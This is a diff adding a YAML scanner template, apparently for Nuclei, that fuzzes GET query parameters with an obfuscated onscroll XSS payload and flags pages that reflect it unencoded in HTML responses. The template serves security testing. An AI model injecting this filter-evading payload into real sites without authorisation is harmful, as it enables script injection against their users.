@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-payload
+
+info:
+  name: Custom Reflection XSS Detection with `onscroll`
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specific payload that includes an onscroll event handler.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss:
+        - "<body \\< onscroll=1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
